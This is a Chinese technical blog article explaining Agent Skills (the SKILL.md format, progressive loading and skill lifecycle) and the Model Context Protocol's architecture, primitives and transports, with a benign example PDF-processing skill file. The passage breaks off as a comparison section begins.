h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>随着大型语言模型（LLMs）的飞速发展，人工智能的应用范式正从单一的“对话”模式，逐步演进至能够自主“行动”的智能体（AI Agent）时代。</p>
<p>这些智能体不再仅仅是信息问答的工具，它们被赋予了理解复杂指令、规划任务、调用外部工具乃至与真实世界交互的能力。然而，要让 AI 智能体真正发挥其潜力，实现通用化、可扩展且安全可靠的能力，其背后需要一套高效且灵活的机制来管理和扩展其功能。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f976ba0c30e5430d8d7446b170cd7f49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=AWQ%2FRlA3yA5Xaw5uefJ17VE7jBU%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><strong>在此背景下，Agent Skills 和 Model Context Protocol (MCP)已成为扩展 AI 智能体能力的两大核心技术路径</strong>。Agent Skills 侧重于将领域专业知识和工作流以文件化的形式进行封装，<strong>强调便携性和可读性</strong>；而 MCP 则致力于构建一套标准化的通信协议，<strong>旨在将 AI 应用程序与各种外部工具、数据源和系统无缝连接</strong>。</p>
<p>两者虽然在设计理念和实现路径上有所差异，但共同的目标都是为了赋能 AI 智能体，使其能够处理更广泛、更复杂的任务。</p>
<p>本文将深入剖析 <strong>Agent Skills 和 MCP</strong> 的架构设计、核心原理，并详细对比两者的异同与各自的优势，并探讨它们在实际应用中的价值。</p>
<h2 data-id="heading-1">一、Agent Skills：基于文件的便携式能力封装</h2>
<h3 data-id="heading-2">1.1、核心定义与设计哲学</h3>
<p>Agent Skills，顾名思义，是赋予 AI 智能体特定“技能”的一种机制。它并非一个复杂的框架或协议，而是一种<strong>基于文件的、便携式的格式</strong>，旨在将特定的领域专业知识、自动化工作流以及可执行代码，以自包含的方式封装在一个个独立的技能目录中。其核心设计哲学在于<strong>简化能力扩展的门槛，强调可读性、可移植性与低集成成本</strong>。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24bd24b7e2f14127b7ce35ab7b2adb49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=i1a8GOZWctnClccmuByNpIQBSuQ%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>如果将 AI 智能体比作一个拥有无限学习潜力的学生，那么 Agent Skills 就如同为这个学生准备的一本本精心编撰的“教材”或“操作手册”。与传统Prompt不同，这些手册不仅包含了理论知识（领域专业知识），还<strong>提供了具体的实践步骤（自动化工作流）和可供执行的工具（可执行代码）</strong>。这种文件化的封装方式，使得技能的创建者可以专注于业务逻辑本身，而无需过多关注复杂的通信协议或部署细节。通过将技能以文件目录的形式组织起来，Agent Skills 实现了<strong>高度的模块化</strong>，每个技能都是一个独立的单元，可以轻松地进行版本控制、分享和复用。</p>
<p>这种设计理念的优势在于，它极大地降低了 AI 智能体获取新能力的技术壁垒。开发者或领域专家只需遵循一套简单的文件结构规范，即可将自己的专业知识转化为 AI 智能体可理解和执行的技能。这种“<strong>即插即用</strong>”的特性，使得 AI 智能体能够快速适应新的任务场景，有效应对不断变化的业务需求。同时，由于其文件化的本质，Agent Skills 天然具备<strong>良好的可读性</strong>，人类开发者可以直观地理解技能的内部逻辑，从而便于调试、维护和协作。</p>
<h3 data-id="heading-3">1.2、SKILL.md 的结构化解析</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0557a35a04842539a60aceb62b942d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=OcpYHN%2BQxPZrTUka9x0HfODcghQ%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>Agent Skills 的核心在于其对 <code>SKILL.md</code> 文件的定义。这个文件是每个技能的“身份证”和“说明书”，它以一种人类可读且机器可解析的格式，详细描述了技能的元数据、使用说明以及如何调用其内部资源。<code>SKILL.md</code> 通常采用 <strong>YAML 前置元数据（YAML Front Matter）结合 Markdown 指令</strong>的方式编写，这使得它既能承载结构化的信息，又能提供丰富的文本描述。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bd16fad3368487d85e56eaeb3db1630~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=VTqGSxeK8wjJ2Lx5I%2FY7Bnk%2FJfk%3D" alt="在这里插入图片描述" loading="lazy"/>
一个完整的skill.md基本如下：</p>
<pre><code class="hljs language-cpp" lang="cpp">---
name: pdf-processing
description: 从 PDF 文件中提取文本和表格、填写表单、合并文档
version: <span class="hljs-number">1.0</span><span class="hljs-number">.0</span>
author: Example Team
---

# PDF 处理技能

## 技能概述
这个技能帮助智能体处理各种 PDF 相关任务，包括文本提取、表格解析、文档合并等操作。

## 何时使用此技能
当用户提出以下需求时激活此技能：
- 从 PDF 中提取文本或数据
- 解析 PDF 中的表格结构
- 合并多个 PDF 文件
- 填写 PDF 表单
- 将 PDF 转换为其他格式

## 前置要求
- 确认环境中已安装 `PyPDF2` 和 `pdfplumber` 库
- 对于 OCR 功能，需要 `pytesseract`
- 检查 PDF 文件是否可访问且未加密

## 操作步骤

### <span class="hljs-number">1.</span> 文本提取
<span class="hljs-string">'''</span>python
# 使用 scripts/extract_text.py
python scripts/extract_text.py --input document.pdf --output output.txt
<span class="hljs-string">'''</span>
### <span class="hljs-number">2.</span> 表格解析

- 使用 `pdfplumber` 识别表格边界
- 将表格数据转换为 CSV 或 JSON 格式
- 参考 `references/table-parsing-guide.md` 了解复杂表格处理方法

### <span class="hljs-number">3.</span> PDF 合并

<span class="hljs-string">'''</span>python
# 使用 scripts/merge_pdfs.py
python scripts/merge_pdfs.py --files file1.pdf file2.pdf --output merged.pdf
<span class="hljs-string">'''</span>
### <span class="hljs-number">4.</span> 处理扫描件

- 如果 PDF 是扫描图像，先调用 OCR 功能
- 详细步骤参见 `references/ocr-guide.md`
- 使用 Tesseract 进行文字识别

## 常见问题处理

- **加密 PDF**：提示用户提供密码或使用解密工具
- **损坏文件**：尝试使用 PDF 修复工具
- **大文件**：分批处理，避免内存溢出

## 输出格式

根据任务类型返回：

- 纯文本：`.txt` 文件
- 表格数据：`.csv` 或 `.json` 文件
- 合并文档：新的 `.pdf` 文件

## 参考信息

- `references/pdf-standards.md` - PDF 格式标准说明
- `references/ocr-guide.md` - OCR 最佳实践
- `references/troubleshooting.md` - 常见问题排查
</code></pre>
<p><strong>YAML 前置元数据</strong>部分通常包含技能的名称、描述、作者、版本、许可证以及所需的兼容性信息等。这些元数据为 AI 智能体提供了关于技能的概览信息，帮助其在众多技能中快速发现和匹配任务需求。例如，一个数据分析技能的元数据可能会声明它需要 <code>pandas</code> 和 <code>matplotlib</code> 库，以便 AI 智能体在加载前检查环境依赖。</p>
<p><strong>Markdown 指令</strong>部分则详细阐述了技能的使用方法、输入参数、预期输出以及任何必要的执行步骤。这部分内容通常以清晰的自然语言编写，辅以代码示例或命令行指令，确保 AI 智能体能够准确理解并执行技能。例如，一个图像处理技能的 Markdown 指令可能会说明如何指定输入图像路径、选择处理模式（如裁剪、缩放）以及输出路径。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38faf2f7430b4b30b1839dbae2b6f738~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=baT0A7hQvUL7JeSpQwJBlihtGCc%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>Agent Skills 引入了<strong>渐进式加载机制</strong>，这是其高效性的关键。这个机制将技能的加载过程分为三个阶段：</p>
<ol>
<li><strong>元数据（Metadata）加载</strong>：AI 智能体首先加载 <code>SKILL.md</code> 中的 YAML 元数据。这一阶段的开销极低，通常只涉及几十到几百个 Token 的处理。智能体可以基于这些轻量级的元数据快速判断技能是否与当前任务相关，从而避免加载不必要的完整技能内容。</li>
<li><strong>指令（Instructions）加载</strong>：如果元数据表明技能可能相关，智能体将进一步加载 <code>SKILL.md</code> 中的 Markdown 指令部分。这一阶段提供了技能的详细使用说明，帮助智能体理解如何与技能交互，包括输入参数的格式、执行逻辑等。此时，智能体已经对技能有了较为全面的认识，可以进行更精确的任务匹配和规划。</li>
<li><strong>资源（Resources）加载</strong>：只有当智能体确定需要执行某个技能时，才会按需加载其关联的外部资源，例如 <code>scripts/</code> 目录下的可执行脚本、<code>references/</code> 目录下的文档或 <code>assets/</code> 目录下的数据文件。这种按需加载的策略极大地优化了资源利用率，避免了不必要的内存占用和计算开销，尤其是在拥有大量技能的复杂系统中，其优势更为明显。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9119218345ce4f48872285fa6c8f48fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=q9oUHm7KIOOV0KICHO6RgHo5SWk%3D" alt="在这里插入图片描述" loading="lazy"/></li>
</ol>
<p>这种分阶段加载的模式，使得 Agent Skills 在<strong>低开销的技能发现和高效率的按需执行</strong>之间取得了良好的平衡，是其实现轻量级、高性能扩展能力的重要基石。</p>
<h3 data-id="heading-4">1.3、Skill 的生命周期管理</h3>
<p>Agent Skills 的生命周期管理相对直观，主要围绕其文件化的特性展开。一个 Skill 从被创建到最终被 AI 智能体使用，通常会经历以下几个核心阶段。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5032be19dbec4aa19121a234dc05d3e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=qsKDPE%2BynBlRezdAJ9zr8bdKvtM%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol>
<li>
<p><strong>技能创建与打包</strong>：开发者或领域专家根据特定的任务需求，编写 <code>SKILL.md</code> 文件，并组织相关的脚本、文档和数据资源，形成一个自包含的技能目录。这个目录可以是一个简单的文件夹，也可以是一个版本控制系统（如 Git）中的仓库。</p>
</li>
<li>
<p><strong>技能发现（Discovery）</strong>：AI 智能体通过扫描预设的技能仓库目录，发现可用的 Skill。在这个阶段，智能体主要读取每个 Skill 目录中的 <code>SKILL.md</code> 文件的 YAML 元数据，以快速了解技能的基本信息，如名称、描述、功能等。这一过程是轻量级的，旨在高效地构建一个可用的技能列表。</p>
</li>
<li>
<p><strong>技能匹配与选择</strong>：当用户提出一个任务请求时，AI 智能体根据任务的语义内容，结合已发现的技能元数据，进行智能匹配。如果初步匹配成功，智能体可能会进一步加载 <code>SKILL.md</code> 的 Markdown 指令部分，以获取更详细的使用说明，从而做出更精确的技能选择决策。</p>
</li>
<li>
<p><strong>技能激活与加载（Activation &amp; Loading）</strong>：一旦某个 Skill 被选中用于执行当前任务，AI 智能体便会“激活”它。这意味着智能体将根据 <code>SKILL.md</code> 中的指令，按需加载该 Skill 所需的脚本、数据或其他外部资源。例如，如果 Skill 包含 Python 脚本，智能体可能会在沙箱环境中执行这些脚本。</p>
</li>
<li>
<p><strong>技能执行（Execution）</strong>：在资源加载完成后，AI 智能体将根据 <code>SKILL.md</code> 中定义的执行流程，调用 Skill 内部的功能。这可能涉及到运行脚本、处理数据、调用外部 API 等操作。Skill 的执行通常在<strong>沙箱环境</strong>中进行，以确保安全性和隔离性，防止恶意代码对系统造成影响。</p>
</li>
<li>
<p><strong>结果返回与卸载</strong>：Skill 执行完成后，将结果返回给 AI 智能体。智能体处理结果后，该 Skill 的相关资源可能会被卸载，以释放系统资源。由于 Agent Skills 本身是无状态的，每次执行都是一个相对独立的过程，这简化了资源管理和并发执行的复杂性。</p>
</li>
</ol>
<p>这种文件驱动的生命周期管理模式，使得 Agent Skills 具有极高的<strong>便携性</strong>和<strong>可维护性</strong>。开发者可以像管理普通文件一样管理 Skill，轻松地进行版本迭代、分享和部署，为 AI 智能体的能力扩展提供了坚实的基础。</p>
<h3 data-id="heading-5">1.4、Agent Skills 与传统 Prompt 的本质差异</h3>
<p>在讨论 Agent Skills 时，一个几乎不可避免的问题是：它与我们已经非常熟悉的 Prompt 到底有什么区别？从表面上看，Skill 似乎只是把一段更长、更结构化的指令写进了 SKILL.md，而不是直接塞进对话上下文中。但如果仅仅把 Agent Skills 理解为“高级 Prompt”或“Prompt 模板的文件化版本”，就会低估它在设计理念和能力边界上的根本变化。</p>
<p>传统 Prompt 的核心特征，是一次性的、上下文内的指令。它依附于具体的对话场景存在，随着上下文的结束而自然消失。无论 Prompt 写得多么精巧，它本质上仍然是在“临时塑形”模型的行为，要求模型在当前窗口内按照某种方式思考和回答问题。这种方式的局限很明显：Prompt 难以复用、难以版本化，也很难表达复杂、分阶段的执行逻辑。更重要的是，Prompt 的主要受众始终是模型本身，而不是人与模型之间的共同理解空间。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6571e4b46004a74bf00a681e531f240~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=XJ3lrDQH3%2Fn76rwNj4o71aex%2Fw4%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>Agent Skills 则完全不同。Skill 的出发点并不是“这一轮对话要模型怎么做”，而是“当遇到某一类问题时，智能体应当具备怎样的一种能力”。它强调的是长期存在、可被反复调用的能力定义，而不是短期生效的行为引导。SKILL.md 的存在，使得能力第一次脱离了对话上下文，成为一种独立、稳定、可管理的实体。智能体不是在每次对话中被重新“说服”去遵循某个 Prompt，而是在需要时主动选择并加载一个已经定义好的 Skill。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9ea2a8293bc42c98e9a316a59e065e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=QoR8J3m1WTX6opuxMU4ehb8CbAw%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>这种差异带来的直接结果，是 <strong>Skill 更容易承载复杂的工作流程</strong>。<strong>一个传统 Prompt 很难清晰地区分“理解任务”“执行步骤”“调用外部资源”“失败时的处理方式”等不同阶段，而 Skill 则可以通过清晰的文本结构和按需加载机制</strong>，将这些阶段自然拆解。对智能体而言，这不再是一段需要完整记住并严格遵循的长指令，而是一套可以逐步理解、逐步执行的行动指南。这种渐进式的使用方式，显著降低了模型在复杂任务中“走偏”的概率。</p>
<p>从人的角度来看，Skill 与 Prompt 的区别同样重要。Prompt 往往是写给模型看的，追求的是对模型行为的即时控制；而 Skill 更像是写给未来的合作者看的，无论这个合作者是人还是智能体。它要求表达清晰、边界明确，也因此更适合被审阅、被讨论、被改进。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd369a1b03354a80b8c83704d4b3dbc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=wNQP8332AoAKdDeyPyIh4eKfLXE%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>正因为如此，一个 Skill 往往对应着某种已经被反复验证过的做事方式，可能来自资深工程师、业务专家，甚至是团队长期积累下来的共识。当这些经验被整理成 Skill，它们就不再依附于某个具体的人，而是可以被任何智能体加载、理解和执行。这种从“个人经验”到“可复用能力”的转化，是 Agent Skills 最容易被低估、却最具长期价值的地方。</p>
<p>与此同时，Skill 的轻量化特性也让它在实际落地中显得格外友好。没有复杂的部署流程，没有必须运行的服务，<strong>一个目录、一份文件，就足以让智能体获得一项新能力</strong>。这种低门槛不仅降低了开发成本，更重要的是，它让更多非工程背景的人也能够参与到智能体能力的构建中来。会写文档的人、懂业务的人、熟悉流程的人，都可以通过 Skill 的形式，把自己的经验直接“教”给 AI。</p>
<p>因此，Agent Skills 并不是对 Prompt 的简单升级，而是一次能力表达范式的切换。Prompt 更像是即时对话中的语言技巧，而 Skill 则是在为智能体构建一套稳定的“做事方法”。<strong>当 AI 从“会说话”走向“能办事”，这种从临时指令到可沉淀能力的转变，恰恰构成了 Agent Skills 最核心、也最不可替代的价值。</strong></p>
<p>也正因如此，当你第一次真正理解 Agent Skills 的设计初衷时，往往会产生一种很强烈的感觉：这不只是给 AI 用的技术，而是一种把人类经验系统性传递给智能体的新方式。如果说过去我们是在教模型“回答问题”，那么从 Agent Skills 开始，我们才真正开始教它“怎么把事做好”。</p>
<h2 data-id="heading-6">二、MCP：AI 时代的“USB-C”标准协议</h2>
<h3 data-id="heading-7">2.1、三层架构深度剖析</h3>
<p>与 Agent Skills 的文件驱动模式不同，Model Context Protocol (MCP) 采取了一种<strong>协议驱动</strong>的策略，旨在为 AI 应用程序与外部系统之间建立一套标准化的通信桥梁。MCP 的设计理念是成为 AI 时代的“USB-C”，即一个<strong>通用、可扩展的接口</strong>，允许 AI 智能体无缝地连接并利用各种外部工具、数据源和系统。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0349016a8b94df2a17725ab00e708cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=g2mIca%2Fn1qSPrVkOBmvVnaXK%2Bp8%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>其核心在于一个清晰定义的三层架构：<strong>AI Host Application (AI 主机应用)、MCP Client (MCP 客户端) 和 MCP Server (MCP 服务器)</strong>。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf007713c5094df2828d87a722804d55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=ocynWW%2BDSe%2Fh0%2FF29QgXStr0RCM%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol>
<li>
<p><strong>AI Host Application (AI 主机应用)</strong>：这一层代表了运行 AI 智能体的主体，例如 Claude Desktop、VS Code 或其他任何需要扩展能力的 AI 应用程序。AI 主机应用是用户与 AI 智能体交互的界面，它负责接收用户指令，并将这些指令转化为对外部能力的需求。它不直接与外部工具交互，而是通过 MCP Client 发送请求并接收响应。</p>
</li>
<li>
<p><strong>MCP Client (MCP 客户端)</strong>：作为 AI 主机应用与 MCP Server 之间的<strong>中间层</strong>，MCP Client 扮演着关键的协调角色。它负责将 AI 主机应用的请求（例如调用某个工具或查询某个数据源）封装成符合 MCP 规范的 JSON-RPC 2.0 消息，并发送给相应的 MCP Server。同时，它也负责接收 MCP Server 返回的响应，并将其解析后传递给 AI 主机应用。MCP Client 还管理着与 MCP Server 的连接生命周期，包括连接的建立、维护和终止，以及处理潜在的连接中断和重试机制。</p>
</li>
<li>
<p><strong>MCP Server (MCP 服务器)</strong>：MCP Server 是<strong>外部能力（工具、数据源、服务）的实际提供者</strong>。它可以是一个运行在本地或远程的进程，负责监听来自 MCP Client 的请求，执行相应的操作（例如调用一个外部 API、查询一个数据库、执行一段代码），并将结果封装成 JSON-RPC 2.0 响应返回给 MCP Client。一个 MCP Server 可以提供多种工具、资源和提示模板，并且可以根据需要进行扩展和部署。例如，一个 MCP Server 可以封装对亚马逊云科技（AWS）服务的调用，或者提供对企业内部数据库的访问接口。</p>
</li>
</ol>
<p>这种三层架构的设计，使得 MCP 能够实现<strong>高度的解耦和灵活性</strong>。AI 主机应用无需关心外部能力的具体实现细节，只需通过标准化的 MCP 协议进行通信。MCP Client 负责协议的转换和连接管理，而 MCP Server 则专注于提供和管理具体的外部能力。这种分层设计不仅提高了系统的可维护性和可扩展性，也为不同 AI 应用程序之间共享和复用外部能力提供了可能。</p>
<h3 data-id="heading-8">2.2、核心原语：Tools, Resources 与 Prompts</h3>
<p>MCP 协议的核心在于其定义的三种基本原语，它们共同构成了 AI 智能体与外部世界交互的基石：<strong>Tools (工具)、Resources (资源) 和 Prompts</strong> <strong>(提示)</strong>。这些原语不仅定义了 AI 智能体可以“做什么”，还定义了它“可以获取什么信息”以及“如何更好地表达自己”。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/995a78f84f6b4e2fa8237dbbeaad5c99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=z1B0S%2BTfMTGj3kQiEZmND7eLl54%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol>
<li>
<p><strong>Tools</strong>(工具) ：工具是 AI 智能体可以<strong>执行的外部函数或操作</strong>。它们可以是任何可编程的接口，例如调用一个 RESTful API、执行一个数据库查询、发送一封电子邮件、或者控制一个物理设备。MCP Server 负责将这些具体的外部功能封装成 AI 智能体可以理解和调用的“工具”。每个工具都通过 JSON Schema 定义其输入参数和预期输出，确保 AI 智能体能够正确地构造请求并解析响应。例如，一个天气查询工具可能需要一个 <code>location</code> 参数，并返回当前温度和天气状况。工具的存在极大地扩展了 AI 智能体的行动边界，使其能够从纯粹的语言理解和生成，跃升到与真实世界进行有意义的交互。</p>
</li>
<li>
<p><strong>Resources (资源)</strong>：资源是 AI 智能体可以<strong>访问和获取的上下文信息</strong>。它们可以是各种形式的数据源，例如文档、数据库记录、传感器数据、用户偏好设置等。MCP Server 同样负责管理和暴露这些资源，允许 AI 智能体根据任务需求动态地获取所需信息。与工具类似，资源也可以通过 JSON Schema 定义其结构和访问方式。例如，一个用户配置文件资源可能包含用户的姓名、邮箱和订阅信息。通过访问资源，AI 智能体能够获得更丰富、更准确的上下文信息，从而做出更明智的决策和生成更相关的响应。</p>
</li>
<li>
<p><strong>Prompts (提示)</strong>：提示是<strong>可重用的交互模板</strong>，用于指导 AI 智能体在特定场景下的语言生成或交互行为。它们通常包含预设的指令、示例对话或格式要求，旨在帮助 AI 智能体更好地理解任务意图，并以符合预期的方式进行响应。例如，一个用于生成会议纪要的提示可能包含会议主题、参与者列表和关键讨论点的占位符。通过标准化和复用提示，可以提高 AI 智能体在特定任务上的表现一致性和效率，减少重复的指令工程工作。</p>
</li>
</ol>
<p><strong>这三大核心原语共同构建了 MCP 强大的能力扩展机制</strong>。工具赋予 AI 智能体“手脚”，使其能够执行外部操作；资源赋予 AI 智能体“眼睛和耳朵”，使其能够感知和获取外部信息；而提示则赋予 AI 智能体“思维框架”，使其能够更好地理解和表达。通过 MCP，AI 智能体能够以一种结构化、可控的方式，充分利用这些外部能力，从而实现更高级别的智能和自主性。</p>
<h3 data-id="heading-9">2.3、传输层与连接生命周期</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b84e4bc287c944b291f3370557aa45fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=deEqgqPrE%2FPOPCHhgPlCpmt8J%2F4%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>MCP 协议的灵活性不仅体现在其核心原语的定义上，更在于其对<strong>传输层</strong>（Transport Layer）的抽象和支持。为了适应不同的部署环境和性能需求，MCP 协议支持多种传输机制，其中最常见的包括 <code>stdio</code> 和 <code>HTTP/SSE</code>。</p>
<ol>
<li>
<p><strong>stdio (标准输入输出)</strong>：这是一种最简单直接的传输方式，通常用于本地进程间通信。AI 主机应用和 MCP Server 可以通过标准输入输出流进行消息交换。这种方式的优点是<strong>性能开销极低，几乎没有网络延迟</strong>，非常适合在同一台机器上运行的 AI 智能体和 MCP Server 之间的通信。然而，它的缺点是<strong>不适合远程通信</strong>，且在复杂的并发场景下管理起来可能较为繁琐。</p>
</li>
<li>
<p><strong>HTTP/SSE (HTTP/Server-Sent Events)</strong>：HTTP 是一种广泛使用的网络协议，而 Server-Sent Events (SSE) 则允许服务器向客户端推送事件。结合 HTTP，MCP 可以实现<strong>远程通信和更灵活的部署</strong>。HTTP/SSE 传输方式的优点是<strong>支持跨网络通信，易于与现有的 Web 基础设施集成</strong>，并且能够利用 HTTP 的各种特性（如认证、加密）。这使得 MCP Server 可以部署在云端，为多个 AI 主机应用提供服务。其缺点是相对于 <code>stdio</code> 会引入一定的网络延迟和协议开销。</p>
</li>
</ol>
<p>除了这两种常见的传输方式，MCP 协议还允许<strong>自定义传输机制</strong>，以满足特定场景下的特殊需求。这种开放性确保了 MCP 能够适应未来不断演进的技术栈和部署模式。</p>
<p><strong>连接生命周期</strong>（Connection Lifecycle）是 MCP 协议中另一个重要的组成部分，它定义了 AI 主机应用（通过 MCP Client）与 MCP Server 之间通信会话的整个过程。一个典型的 MCP 连接生命周期包括以下几个阶段：</p>
<ol>
<li>
<p><strong>初始化 (Initialization)</strong>：MCP Client 向 MCP Server 发送初始化请求，建立连接。这个请求通常会包含 Client 的基本信息和期望的能力。</p>
</li>
<li>
<p><strong>能力协商 (Capability Negotiation)</strong>：MCP Server 响应 Client 的初始化请求，并告知其所提供的工具、资源和提示等能力。Client 和 Server 之间可能会进行一系列的协商，以确定双方都支持的功能集。</p>
</li>
<li>
<p><strong>就绪通知 (Ready Notification)</strong>：在能力协商完成后，Server 会向 Client 发送就绪通知，表明连接已准备好接收和处理请求。</p>
</li>
<li>
<p><strong>操作 (Operation)</strong>：这是连接生命周期中的主要阶段，Client 和 Server 之间进行双向的 JSON-RPC 2.0 消息交换，包括请求、响应和通知。AI 智能体通过 Client 调用 Server 提供的工具和资源，Server 则执行操作并返回结果。</p>
</li>
<li>
<p><strong>终止 (Termination)</strong>：当通信会话结束时，Client 或 Server 可以发起终止请求，优雅地关闭连接。这有助于释放系统资源并确保数据的一致性。</p>
</li>
</ol>
<p>MCP 协议通过对传输层和连接生命周期的精心设计，确保了 AI 智能体与外部系统之间通信的<strong>可靠性、安全性和可管理性</strong>。这种协议驱动的方法，为构建高度集成和可扩展的 AI 智能体生态系统奠定了坚实的基础。</p>
<h2 data-id="heading-10">三、Skill 与 MCP 的深度对比分析</h2>
<p>Agent Skills 和 MCP 作为扩展 AI 智能体能力的两大范式，虽然目标一致，但在设计理念、实现机制和适用场景上却存在显著差异。深入理解这些差异，对于开发者选择合适的技术路径，构建高效、稳定的 AI 智能体至关重要。</p>
<h3 data-id="heading-11">3.1、哲学差异：静态封装 vs 动态交互</h3>
<p>Agent Skills 和 MCP 在其核心哲学上展现出根本性的不同。Agent Skills 倾向于<strong>静态封装与知识管理</strong>，而 MCP 则侧重于<strong>动态交互与系统集成</strong>。</p>
